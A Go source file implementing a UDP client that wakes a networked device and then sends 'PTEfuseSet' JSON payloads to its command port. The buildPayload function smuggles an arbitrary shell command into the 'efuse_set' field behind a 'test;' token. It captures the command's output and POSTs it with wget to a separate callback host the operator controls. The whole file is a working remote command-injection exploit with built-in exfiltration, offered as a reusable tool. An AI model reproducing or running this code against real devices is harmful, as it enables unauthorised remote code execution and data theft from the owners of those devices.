package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"time"
)

// Device UDP ports. The wake port must be probed first to bring the device up;
// only then does the command port accept PTEfuseSet payloads.
const (
	wakePort    = 7320 // probe to wake the device before the command channel
	commandPort = 7329 // PTEfuseSet / wget-callback command channel
)

// Sender holds a single persistent UDP connection to the target device and
// wraps shell commands into the PTEfuseSet JSON payload. Every request sent
// and every response received is logged.
type Sender struct {
	mu           sync.Mutex
	conn         *net.UDPConn
	addr         *net.UDPAddr
	device       string
	wakePort     int
	commandPort  int
	advertise    string // host:port the device can reach (for the wget callback)
	status       string // "disconnected" | "connecting" | "connected"
	readerDone   chan struct{}
}

// NewSender creates a Sender for the given device IP. Ports are fixed by the
// protocol constants (wakePort, commandPort); only the IP is configurable.
func NewSender(device string, advertise string) *Sender {
	return &Sender{
		device:      device,
		wakePort:    wakePort,
		commandPort: commandPort,
		advertise:   advertise,
		status:      "disconnected",
	}
}

// SetWakePort overrides the wake port (test helper).
func (s *Sender) SetWakePort(p int) {
	s.mu.Lock()
	s.wakePort = p
	s.mu.Unlock()
}

// SetCommandPort overrides the command port (test helper).
func (s *Sender) SetCommandPort(p int) {
	s.mu.Lock()
	s.commandPort = p
	if s.conn != nil {
		s.conn.Close()
		s.conn = nil
	}
	s.status = "disconnected"
	s.mu.Unlock()
}

// Status returns the current connection status.
func (s *Sender) Status() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.status
}

// Target returns the currently configured device IP. Ports are fixed by
// protocol constants and are not shown in the UI.
func (s *Sender) Target() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.device
}

func (s *Sender) setStatus(st string) {
	s.mu.Lock()
	s.status = st
	s.mu.Unlock()
}

// SetTarget changes the device IP and tears down any existing connection so
// the next command reconnects to the new target. Ports are fixed by protocol
// constants and are not changed here.
func (s *Sender) SetTarget(device string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.device = device
	if s.conn != nil {
		s.conn.Close()
		s.conn = nil
	}
	s.status = "disconnected"
}

// Disconnect closes the UDP connection and marks the sender disconnected.
func (s *Sender) Disconnect() {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.conn != nil {
		s.conn.Close()
		s.conn = nil
	}
	s.status = "disconnected"
}

// probePort sends payload to device:port on a short-lived socket and waits up
// to timeout for any reply. It returns true if at least one datagram was
// received (content is logged but not matched). A separate socket avoids
// racing the background reader goroutine over the shared command socket.
func (s *Sender) probePort(port int, payload []byte, timeout time.Duration) bool {
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", s.device, port))
	if err != nil {
		log.Printf("probe %s:%d: resolve: %v", s.device, port, err)
		return false
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		log.Printf("probe %s:%d: open udp: %v", s.device, port, err)
		return false
	}
	defer conn.Close()

	log.Printf("udp  -> %s:%d  %q", s.device, port, string(payload))
	if _, err := conn.Write(payload); err != nil {
		log.Printf("probe %s:%d: write: %v", s.device, port, err)
		return false
	}
	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 4096)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			log.Printf("udp   <- %s:%d  (no reply: %v)", s.device, port, err)
			return false
		}
		log.Printf("udp   <- %s:%d  %q", s.device, port, string(buf[:n]))
		return true
	}
}

// wakeDevice probes the wake port to bring the device up. The reply content is
// irrelevant; we only need to knock on the port and move on.
func (s *Sender) wakeDevice() bool {
	ok := s.probePort(s.wakePort, []byte("123"), 2*time.Second)
	if !ok {
		log.Printf("wake %s:%d: no reply (device may already be awake)", s.device, s.wakePort)
	}
	return ok
}

// Connect performs the two-phase connection sequence: first wake the device on
// the wake port, then verify the command port answers with "format failed".
// On success it opens the persistent command connection.
func (s *Sender) Connect() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.conn != nil {
		return s.status == "connected"
	}
	s.status = "connecting"

	// Phase 1: wake the device on the wake port.
	s.wakeDevice()
	// Give the device a moment to bring up the command channel.
	time.Sleep(200 * time.Millisecond)

	// Phase 2: verify the command port answers with "format failed".
	if !s.probePort(s.commandPort, []byte("123"), 3*time.Second) {
		s.status = "disconnected"
		return false
	}

	if err := s.openConnUnlocked(); err != nil {
		log.Printf("connect: open command udp: %v", err)
		s.status = "disconnected"
		return false
	}
	s.status = "connected"
	return true
}

func (s *Sender) openConnUnlocked() error {
	if s.conn != nil {
		return nil
	}
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", s.device, s.commandPort))
	if err != nil {
		return err
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return err
	}
	s.conn = conn
	s.addr = addr
	s.startReader()
	return nil
}

// startReader launches a background goroutine that logs every datagram the
// device sends back. It runs until the connection is closed or errors out; on
// error it tears down the socket so the next Send reconnects cleanly.
func (s *Sender) startReader() {
	done := make(chan struct{})
	s.readerDone = done
	go func() {
		defer close(done)
		buf := make([]byte, 65536)
		for {
			n, err := s.conn.Read(buf)
			if err != nil {
				var ne net.Error
				if errors.As(err, &ne) && ne.Timeout() {
					log.Printf("udp reader %s:%d: timeout", s.device, s.commandPort)
				} else if !strings.Contains(err.Error(), "closed") {
					log.Printf("udp reader %s:%d: %v", s.device, s.commandPort, err)
				}
				// Tear down the socket so a subsequent Send reconnects rather
				// than writing into a dead connection.
				s.mu.Lock()
				if s.conn != nil {
					s.conn.Close()
					s.conn = nil
				}
				s.status = "disconnected"
				s.mu.Unlock()
				return
			}
			log.Printf("udp   <- %s:%d  %q", s.device, s.commandPort, string(buf[:n]))
		}
	}()
}

// Send wraps cmd in the wget callback payload and sends it as one UDP datagram.
// If there is no active command connection, it first wakes the device on the
// wake port, then opens the command connection.
func (s *Sender) Send(cmd string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.conn == nil {
		// No active connection: wake the device, then open the command channel.
		s.wakeDevice()
		time.Sleep(200 * time.Millisecond)
		if err := s.openConnUnlocked(); err != nil {
			log.Printf("send: open udp %s:%d: %v", s.device, s.commandPort, err)
			s.status = "disconnected"
			return err
		}
	}
	payload := buildPayload(cmd, s.advertise)
	log.Printf("udp  -> %s:%d  %s", s.device, s.commandPort, payload)
	if _, err := s.conn.Write([]byte(payload)); err != nil {
		log.Printf("send: write: %v", err)
		s.status = "disconnected"
		return err
	}
	if s.status != "connected" {
		s.status = "connected"
	}
	return nil
}

// buildPayload produces the exact JSON sent to the device. The shell command
// is wrapped so its output is POSTed back to advertise via wget. The leading
// "test;" token is required for the device to execute the injected shell.
func buildPayload(cmd, advertise string) string {
	efuse := fmt.Sprintf("test;O=$(%s);wget -q --post-data=\"$O\" http://%s/;", cmd, advertise)
	obj := map[string]interface{}{
		"method": "PTEfuseSet",
		"param":  map[string]string{"efuse_set": efuse},
		"result": "failure",
	}
	b, _ := json.Marshal(obj)
	return string(b)
}
